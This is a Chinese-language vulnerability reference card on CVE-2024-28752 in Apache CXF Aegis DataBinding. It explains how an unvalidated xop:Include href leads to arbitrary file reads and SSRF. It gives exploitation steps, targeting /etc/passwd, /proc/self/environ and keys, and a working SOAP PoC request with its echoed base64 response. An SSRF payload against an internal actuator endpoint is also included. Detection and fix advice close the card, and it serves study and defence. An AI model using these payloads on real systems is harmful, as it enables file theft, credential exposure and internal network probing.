---
id: web-generic-ssrf-apache-cxf-aegis-xop-include-file-read
title: Apache CXF Aegis DataBinding xop:Include href 未校验：file:// 任意文件读取与 SSRF（CVE-2024-28752）
type: scenario
domain: web
path: web/generic/ssrf
technique: cxf-aegis-xop-include-url-data-source
aliases:
- CVE-2024-28752
- Apache CXF SSRF
- CXF Aegis SSRF
- xop Include href
- URLDataSource 任意 URL
- CXF 任意文件读取
- MTOMDecorator startElement
tags:
- ssrf
- java
- apache-cxf
- webservice
- soap
- xop
- file-read
- cve-2024-28752
cve:
- CVE-2024-28752
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V51
  verified_at: '2026-11-05T09:06:54+08:00'
  notes: 已对照原文与8张图核对：AbstractHTTPDestination#invoke→MTOMDecorator#startElement 取 href→JAXBAttachmentUnmarshaller#getAttachmentAsDataHandler→AttachmentUtil.getAttachmentDataSource，contentId 含 :// 时 new URLDataSource(new URL(contentId))，Base64Data.get() 读取并在 Unmarshalling Error 回显；实测 href=file:///C:/flag 读取 flag；修复为 xop.follow.urls 系统属性默认 false。卡与原文一致。未验证点：http:// SSRF 为同代码路径推导、原文未单独实测（卡已注明）；frontmatter 无 sources/source_url。
---

## 一句话结论

Apache CXF 在使用 Aegis DataBinding 时，MTOM 解析器 `MTOMDecorator#startElement` 会把 SOAP 请求里 `xop:Include` 的 `href` 原样交给 `AttachmentUtil.getAttachmentDataSource`；当 `href` 含 `://` 时直接 `new URLDataSource(new URL(href))`，随后 `Base64Data.get()` 读取该 URL 内容并 base64 编码进 SOAP Fault 回显——攻击者用 `file:///C:/flag` 可读取服务器任意文件，用 `http://内网地址` 可做完整回显 SSRF（CVE-2024-28752）。

## 原理

- 入口：CXF 服务端 `AbstractHTTPDestination#invoke` 接收 SOAP 请求并交给拦截器链；MTOM 解析时进入 `MTOMDecorator#startElement`。
- 触发：当元素为 `{http://www.w3.org/2004/08/xop/include}Include` 时，取 `href` 属性，调用 `this.au.getAttachmentAsDataHandler(href)`。
- 调用链：`JAXBAttachmentUnmarshaller#getAttachmentAsDataHandler(contentId)` → `AttachmentUtil.getAttachmentDataSource(contentId, attachments)`。
- 缺陷代码：`if (contentId.startsWith("cid:")) {...} else if (contentId.indexOf("://") == -1) { return loadDataSource(contentId, atts); } else { return new URLDataSource(new URL(contentId)); }`。只要 `href` 里含 `://`，就无条件把它当 URL 构造 `URLDataSource`，没有协议白名单、没有内网/回环限制、没有 `file://` 禁止。
- 实际读取：`URLDataSource` 只是保存 URL，真正读取发生在 `Base64Data.get()`——`InputStream is = this.dataHandler.getDataSource().getInputStream(); baos.readFrom(is);`，即按 URL 打开流读取全部内容。
- 回显：`Base64Data` 被当作 `count`（数字）字段反序列化，读取到的内容被 base64 编码后进入 `Unmarshalling Error: Not a number: <base64>` 的 SOAP Fault，直接回显给攻击者。
- 影响面：官方公告与文章均指出仅在应用使用 Aegis DataBinding 时受影响；使用其他 data binding（包括默认 data binding）不受影响。

## 触发条件

- 目标为使用 Apache CXF 且启用 Aegis DataBinding 的 WebService 服务端，SOAP 端点可达。
- 服务端接受 MTOM/XOP 附件解析（`xop:Include` 被处理）。
- 攻击者可控制 SOAP Body 中某个元素的 `xop:Include href`。
- 服务端进程对目标文件有读权限（file://）或能访问目标内网地址（http://）。

## 利用步骤

1. 确认目标为 CXF WebService，且服务使用 Aegis DataBinding（可通过 WSDL、错误信息、依赖判断）。
2. 构造 SOAP 请求，在业务参数元素内放置 `xop:Include`，`href` 填 `file:///C:/flag`（Linux 用 `file:///etc/passwd`）。
3. 发送 POST；服务端读取文件并把内容 base64 编码进 `Unmarshalling Error: Not a number: ...` 的 SOAP Fault。
4. 解码 faultstring 中的 base64，得到文件内容。
5. 将 `href` 换成 `http://127.0.0.1:port/`、`http://内网主机/` 等，可读取内网 HTTP 响应（回显 SSRF）；也可探测端口/服务。
6. 若目标为 Linux，可读取 `/proc/self/environ`、配置文件、密钥等；结合业务可进一步扩大。

## PoC

```http
POST /test HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: multipart/related; boundary=----kkkkkk123123213
Content-Length: 472
Connection: close

------kkkkkk123123213
Content-Disposition: form-data; name="1"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://service.namespace/">
   <soapenv:Header/>
   <soapenv:Body>
      <web:test>
         <arg0>
            <count>
               <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/flag"></xop:Include>
            </count>
         </arg0>
      </web:test>
   </soapenv:Body>
</soapenv:Envelope>
------kkkkkk123123213--
```

```text
# 响应：HTTP/1.1 500 Server Error
# <soap:Fault><faultcode>soap:Client</faultcode>
# <faultstring>Unmarshalling Error: Not a number: ZmxhZ2ZsYWdmbGFn...==</faultstring>
# 对 faultstring 中的 base64 解码即得到 C:/flag 内容（文章实测 flagflagflag...）。
```

SSRF 变体（把 href 换成内网 HTTP 地址）：

```xml
<xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="http://127.0.0.1:8080/actuator/env"></xop:Include>
```

## 变体与关联

- 变体：`href` 使用 `http://`/`https://`/`file://` 等任意 `java.net.URL` 支持的协议；`file://` 为任意文件读取，`http://` 为回显 SSRF。
- 变体：`cid:` 前缀走 `loadDataSource` 从附件集合取，不是本漏洞路径；`://` 分支才是危险点。
- 关联：[[web-generic-ssrf-oa-getrawfile-weak-blacklist]]（URL 参数黑名单不严导致 SSRF 读内网）；[[web-generic-xxe-oob-exfil]]（XML 外部实体读取文件/带外，与本漏洞同属 XML 解析器信任外部引用）；[[web-generic-ssrf-configurable-push-url-blind]]（盲 SSRF 的 DNSLog 验证）。
- 边界：文章实测的是 `file:///C:/flag` 任意文件读取；`http://` 回显 SSRF 由同一 `URLDataSource` 代码路径推导，未在文章中单独实测。仅在 Aegis DataBinding 下受影响。

## 检测与防御

- 检测：审计 CXF 服务是否使用 Aegis DataBinding；监控 SOAP 请求中出现 `xop:Include` 且 `href` 含 `://`（尤其 `file://`、`http://` 内网地址）；关注 SOAP Fault 中出现 `Unmarshalling Error: Not a number:` 后跟大段 base64 的响应。
- 修复：升级到包含 CVE-2024-28752 修复的 CXF 版本；修复版 `AttachmentUtil` 仅在系统属性 `org.apache.cxf.attachment.xop.follow.urls`（默认 false）开启时才允许 `URLDataSource`，否则返回 null。
- 加固：不要开启 XOP URL 跟随；对 `href` 做协议与主机白名单（禁止 `file://`、回环、内网、链路本地地址）；限制服务端文件读权限与出站访问；不需要 MTOM 时关闭相关解析。
